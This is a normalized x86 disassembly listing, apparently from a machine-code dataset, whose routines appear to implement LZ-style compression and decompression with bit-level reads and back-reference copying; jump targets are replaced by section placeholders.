push ebp
mov ebp esp
sub esp 0x170
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi ecx
lea ecx [ eax - 0x1 ]
mov ebx edx
cmp ecx 0x9
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0xfffffffe
pop ebx
call sub_40b946
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax * 8 ]
push 0x90
sub esi eax
lea edx [ ebp - 0xd4 ]
push 0x0
lea esi [ esi * 4 + r--data ]
push edx
mov [ ebp - 0xdc ] esi
call sub_4105f0
or eax 0xffffffff
lea ecx [ ebp - 0x44 ]
push 0x40
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
lea eax [ ebx + edi ]
mov [ ebp - 0xb4 ] edi
mov [ ebp - 0xb8 ] edi
mov edi [ ebp + 0x8 ]
mov edx ecx
push 0x0
push edx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] edi
mov [ ebp - 0x68 ] ecx
call sub_4105f0
mov ecx [ ebp - 0x68 ]
or eax 0xffffffff
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x68 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8c ]
xor eax eax
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x88 ]
add esp 0x18
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x9c ] 0x8
mov [ ebp - 0x98 ] 0x1
call sub_4019d0
test eax eax
jne r-xdata
pop esi
pop edi
mov eax 0xfffffffe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xb8 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0xe0 ] edx
mov [ ebp - 0x90 ] edi
mov edx 0x800
cmp eax 0x800
jae r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp - 0x16c ] edx
cmp eax 0x800000
jb r-xdata
mov edx eax
mov ecx [ ebp - 0x84 ]
mov edi 0xffff
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x164 ] edi
cmp ecx 0xffffffff
je r-xdata
mov eax 0x800000
cmp ebx eax
jae r-xdata
mov eax 0x800000
cmp ecx 0x800000
jae r-xdata
cmp edx 0x8
jb r-xdata
mov eax ebx
cmp ebx 0x100
jae r-xdata
mov [ ebp - 0x170 ] eax
mov eax ecx
cmp eax 0x100
jb r-xdata
mov [ ebp - 0x170 ] eax
mov eax 0x100
mov eax [ esi + 0x14 ]
push eax
lea ecx [ ebp - 0x170 ]
lea eax [ ebp - 0xd4 ]
call sub_4018c0
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x164 ] edi
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x160 ] eax
mov eax [ ebp - 0x80 ]
cmp eax [ ebp - 0x15c ]
jae r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x64 ]
test eax eax
je r-xdata
mov [ ebp - 0x15c ] eax
push 0x0
xor eax eax
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc0 ] 0x1
call sub_401930
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push 0xffffffff
push 0x0
push 0x0
call edx
add esp 0x10
cmp [ ebp - 0xd0 ] eax
jbe r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ ebp - 0xd8 ]
push edx
lea eax [ ebp - 0xd4 ]
call sub_401dd0
xor edi edi
call sub_401a50
push 0x1000000
call sub_401ba0
mov eax [ ebp - 0x90 ]
mov [ eax ] 0xff
inc [ ebp - 0x90 ]
add esp 0x8
lea eax [ ebp - 0xd4 ]
call sub_401ad0
mov eax [ ebp - 0x90 ]
sub eax [ ebp + 0x8 ]
mov edx [ ebp - 0xf0 ]
mov ecx eax
mov [ edx ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x5c ] ecx
test eax eax
je r-xdata
mov edi [ ebp - 0xcc ]
jmp r-xdata
lea esi [ ebp - 0x170 ]
call sub_4013c0
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push 0x4
push ecx
mov ecx [ ebp - 0x60 ]
push ecx
call edx
add esp 0x10
mov eax [ ebp - 0x90 ]
sub eax [ ebp + 0x8 ]
cmp [ ebp - 0xd8 ] 0x0
mov ecx [ ebp - 0xc8 ]
mov ebx edi
mov [ ebp - 0x5c ] eax
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xf8 ] ecx
jne r-xdata
cmp edi 0x2
jb r-xdata
mov edx [ ebp - 0xbc ]
mov [ ebp - 0xe0 ] edx
mov ecx [ esi + 0x10 ]
mov eax 0x1
add [ ebp - 0xd8 ] eax
push 0x0
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0x160 ] ecx
call sub_401930
add esp 0x4
jne r-xdata
cmp ecx [ ebp - 0x84 ]
ja r-xdata
cmp ecx 0xd00
ja r-xdata
mov eax [ ebp - 0xdc ]
xor esi esi
cmp [ eax ] esi
jbe r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ ebp - 0xd8 ]
push edx
lea eax [ ebp - 0xd4 ]
call sub_401dd0
mov eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0xd4 ]
push ebx
push ecx
mov [ ebp - 0xd8 ] 0x0
call sub_401cd0
mov edx [ ebp - 0xdc ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x160 ] eax
inc esi
mov eax ebx
push esi
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
call sub_401930
mov esi [ ebp - 0xdc ]
add esp 0x14
jmp r-xdata
cmp edi [ eax + 0x8 ]
jae r-xdata
mov edi [ ebp - 0xcc ]
cmp ecx [ ebp - 0xc0 ]
je r-xdata
mov edx edi
lea eax [ ebp - 0xd4 ]
call sub_401e80
mov [ ebp - 0xf4 ] eax
mov eax [ ebp - 0xdc ]
mov eax [ eax ]
dec edi
mov [ ebp - 0xec ] eax
cmp eax edi
jbe r-xdata
cmp [ ebp - 0xec ] esi
jbe r-xdata
mov [ ebp - 0xec ] edi
mov [ ebp - 0xe4 ] esi
jmp r-xdata
cmp [ ebp - 0xd0 ] ebx
jbe r-xdata
mov eax [ ebp - 0xdc ]
cmp ebx [ eax + 0x4 ]
jb r-xdata
mov edx [ eax + 0x10 ]
mov [ ebp - 0x160 ] edx
mov ecx [ eax + 0x10 ]
shr ecx 0x2
mov [ ebp - 0x160 ] ecx
jmp r-xdata
mov ebx [ ebp - 0xe8 ]
cmp esi [ ebp - 0xec ]
jb r-xdata
mov ecx [ ebp - 0xc8 ]
mov edx edi
lea eax [ ebp - 0xd4 ]
call sub_401e80
test eax eax
js r-xdata
push 0x0
mov eax 0x1
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
call sub_401930
mov edi [ ebp - 0xcc ]
add [ ebp - 0xe4 ] 0x9
add esp 0x4
inc esi
cmp edi 0x2
jb r-xdata
mov edx [ ebp - 0xf4 ]
mov ecx edi
sub ecx [ ebp - 0xe8 ]
add ecx esi
lea edx [ edx + ecx * 4 ]
add edx ecx
mov ecx [ ebp - 0xe4 ]
add ecx eax
cmp edx ecx
jg r-xdata
inc [ ebp - 0x48 ]
add [ ebp - 0xd8 ] esi
mov esi [ ebp - 0xdc ]
jmp r-xdata
cmp [ ebp - 0xd0 ] 0x0
ja r-xdata
sub_402440
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
xor ecx ecx
xor eax eax
xor edx edx
mov [ ebp - 0x8 ] 0x1
lea esp [ esp ]
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov [ ebp - 0x4 ] edx
mov ebx 0x1
lea esp [ esp ]
mov bl [ eax + esi ]
mov [ edx + edi ] bl
inc edx
inc eax
jmp r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edi ecx
shr edi 0x8
and edi 0x1
lea ebx [ edi + ebx * 2 ]
test cl 0x7f
je r-xdata
test cl 0x7f
je r-xdata
cmp ebx 0x2
jne r-xdata
test ecx 0x100
je r-xdata
movzx edi [ eax + esi ]
add ebx 0xfffffffd
shl ebx 0x8
add edi ebx
inc eax
cmp edi 0xffffffff
je r-xdata
mov edi [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
mov [ ecx ] edx
mov ecx [ ebp + 0xc ]
pop esi
pop ebx
cmp eax ecx
jne r-xdata
inc edi
mov [ ebp - 0x8 ] edi
test cl 0x7f
je r-xdata
sbb eax eax
and eax 0xfffffffc
add eax 0xffffff37
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x8
and edx 0x1
test cl 0x7f
je r-xdata
mov esi 0xd00
cmp esi edi
sbb esi esi
neg esi
add edx esi
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov esi edx
sub esi edi
mov edi [ ebp + 0x10 ]
mov bl [ esi + edi ]
add esi edi
mov [ edx + edi ] bl
inc edx
inc esi
mov edi edi
mov edx 0x1
jmp r-xdata
mov ebx ecx
shr ebx 0x8
and ebx 0x1
lea edx [ ebx + edx * 2 ]
test edx edx
jne r-xdata
mov bl [ esi ]
mov [ edx + edi ] bl
inc edx
inc esi
dec [ ebp - 0xc ]
jne r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
test cl 0x7f
je r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov ebx ecx
shr ebx 0x8
and ebx 0x1
lea edx [ ebx + edx * 2 ]
test cl 0x7f
je r-xdata
add edx 0x2
test ecx 0x100
je r-xdata
sub_4025d0
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ecx ecx
xor eax eax
push edi
xor ebx ebx
mov [ ebp - 0x8 ] 0x1
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
nop
mov dl [ eax + esi ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
inc ebx
inc eax
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
add ecx ecx
lea edi [ edx + edi * 2 ]
test cx cx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
cmp edi 0x2
jne r-xdata
movzx edx [ eax + esi ]
add edi 0xfffffffd
shl edi 0x8
add edx edi
inc eax
cmp edx 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] ebx
mov ecx [ ebp + 0x8 ]
pop edi
pop ebx
cmp eax ecx
jne r-xdata
inc edx
mov [ ebp - 0x8 ] edx
add ecx ecx
mov [ ebp - 0x4 ] edx
test cx cx
jne r-xdata
sbb eax eax
and eax 0xfffffffc
add eax 0xffffff37
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
mov edi ecx
shr edi 0x10
add ecx ecx
and edi 0x1
test cx cx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
test edi edi
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx 0xd00
cmp edx [ ebp - 0x4 ]
sbb edx edx
neg edx
add edi edx
mov [ ebp - 0xc ] edi
mov edi ebx
sub edi [ ebp - 0x4 ]
inc ebx
add edi [ ebp + 0xc ]
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
jmp r-xdata
mov edi 0x1
lea ebx [ ebx ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0xc ] edx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
add ecx ecx
lea edi [ edx + edi * 2 ]
test cx cx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
add edi 0x2
sub_4027c0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx 0x1
lea ebx [ ebx ]
mov dl [ esi + edi ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edi [ ebp + 0x8 ]
inc ebx
inc esi
jmp r-xdata
test edx edx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
lea ebx [ edx + ebx * 2 ]
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx 0x2
jne r-xdata
test edx edx
je r-xdata
movzx edx [ esi + edi ]
add ebx 0xfffffffd
shl ebx 0x8
add edx ebx
inc esi
cmp edx 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
cmp esi eax
jne r-xdata
inc edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
test ecx ecx
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + edi ]
mov ecx 0x1f
dec ecx
mov edx eax
shr edx cl
mov ebx eax
add esi 0x4
shr ebx 0x1f
and edx 0x1
jmp r-xdata
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
test ecx ecx
je r-xdata
lea ebx [ edx + ebx * 2 ]
test ebx ebx
jne r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov edx [ ebp - 0xc ]
mov edi 0xd00
cmp edi edx
sbb edi edi
neg edi
add ebx edi
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x4 ]
mov edi ebx
sub edi edx
add edi [ ebp + 0x10 ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
mov ebx 0x1
lea ebx [ ebx ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0xc ] edx
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
lea ebx [ edx + ebx * 2 ]
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
add ebx 0x2
test edx edx
je r-xdata
sub_4029a0
push ebp
mov ebp esp
sub esp 0x10
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
xor ecx ecx
xor eax eax
xor ebx ebx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx 0x1
cmp eax [ ebp + 0xc ]
jae r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x1000002
ja r-xdata
mov edi ecx
shr edi 0x8
and edi 0x1
lea edx [ edi + edx * 2 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
mov [ ebx + edi ] dl
inc ebx
inc eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov [ ebp - 0x4 ] ebx
test cl 0x7f
je r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
cmp edx 0x2
jne r-xdata
test ecx 0x100
je r-xdata
cmp eax [ ebp + 0xc ]
jae r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx edi [ eax + esi ]
add edx 0xfffffffd
shl edx 0x8
add edi edx
inc eax
cmp edi 0xffffffff
je r-xdata
test cl 0x7f
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ebx
cmp eax ecx
jne r-xdata
inc edi
mov [ ebp - 0xc ] edi
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x8
and edx 0x1
test cl 0x7f
je r-xdata
mov ebx [ ebp - 0x4 ]
mov esi 0xd00
cmp esi edi
sbb esi esi
neg esi
add edx esi
mov [ ebp - 0x10 ] edx
add edx ebx
cmp edx [ ebp - 0x8 ]
ja r-xdata
mov edx 0x1
jmp r-xdata
mov ebx ecx
shr ebx 0x8
and ebx 0x1
lea edx [ ebx + edx * 2 ]
test edx edx
jne r-xdata
cmp edi ebx
ja r-xdata
test cl 0x7f
je r-xdata
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
sub esi edi
mov edi [ ebp + 0x10 ]
mov dl [ esi + edi ]
add esi edi
mov [ ebx + edi ] dl
inc ebx
inc esi
nop
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov dl [ esi ]
mov [ ebx + edi ] dl
inc ebx
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov ebx ecx
shr ebx 0x8
and ebx 0x1
lea edx [ ebx + edx * 2 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
movzx ecx [ eax + esi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
add edx 0x2
test ecx 0x100
je r-xdata
sub_402c10
push ebp
mov ebp esp
sub esp 0x10
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
push ebx
xor ecx ecx
xor eax eax
push edi
xor ebx ebx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
lea ecx [ ecx ]
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
lea esp [ esp ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
pop edi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1000002
ja r-xdata
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
inc ebx
inc eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
pop edi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
add ecx ecx
test cx cx
jne r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
cmp edi 0x2
jne r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ecx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx edx [ eax + esi ]
add edi 0xfffffffd
shl edi 0x8
add edx edi
inc eax
cmp edx 0xffffffff
je r-xdata
add ecx ecx
mov [ ebp - 0x4 ] edx
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ebx
cmp eax ecx
jne r-xdata
inc edx
mov [ ebp - 0xc ] edx
mov edi ecx
shr edi 0x10
add ecx ecx
and edi 0x1
test cx cx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
test edi edi
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx 0xd00
cmp edx [ ebp - 0x4 ]
sbb edx edx
neg edx
add edi edx
mov [ ebp - 0x10 ] edi
add edi ebx
cmp edi [ ebp - 0x8 ]
ja r-xdata
mov edi 0x1
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp edx ebx
ja r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi ebx
sub edi edx
add edi [ ebp + 0xc ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
lea ebx [ ebx ]
cmp edi [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0x10 ] edx
jne r-xdata
jmp r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
add edi 0x2
sub_402ec0
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor esi esi
xor eax eax
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0xc ] edx
mov esi [ eax + edi ]
mov edx esi
add eax 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx esi
shr edx cl
and edx 0x1
jmp r-xdata
mov ebx 0x1
nop
cmp eax [ ebp + 0xc ]
jae r-xdata
test edx edx
je r-xdata
mov esi [ eax + edi ]
mov edx esi
add eax 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx esi
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
